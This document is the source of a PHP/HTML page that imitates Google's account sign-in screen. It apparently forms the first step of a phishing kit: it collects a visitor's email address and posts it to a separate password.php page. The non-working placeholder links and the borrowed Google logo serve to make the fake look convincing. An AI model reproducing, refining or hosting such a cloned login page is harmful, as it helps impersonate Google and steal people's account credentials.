<html>
<title>Sign in - Google Accounts</title>

<head>
	<link href="style.css" rel="stylesheet">
</head>

<?php 
session_start();
?>
<body>
	<center>

		<div id="form1">
			<div id="logo">
				<img src="https://cdn.freebiesupply.com/images/large/2x/google-logo-transparent.png" width="80"
					height="26" />
			</div>
			<p id="signin">Sign in</p>
			<p id="usegoogleacct">Use your Google Account</p>
			<div id="mailbox">
				<form action="password.php" method=POST>
					<input placeholder="Email or phone" type="text" name="emailinput" style="width:330px; height:48px; border: solid 1px #c2c4c6; 
				font-size:14px; padding-left:8px; margin-top:15px; border-radius: 2px; margin-left: -30px" required />
			</div>
			<div id="forgotemail"><a href="#" />Forgot email?</a></div>
			<p id="info">Not your computer? Use Guest mode to sign in privately.</p>
			<div id="learnmore"><a href="#" />Learn more</a></div>
			<div><input type="submit" name="nextBtn" id="nextBtn" value="Next" /></div>
			<div id="createaccount"><a href="#" />Create account</a></div>
			</form>
			
		</div>
	</center>
</body>

</html>
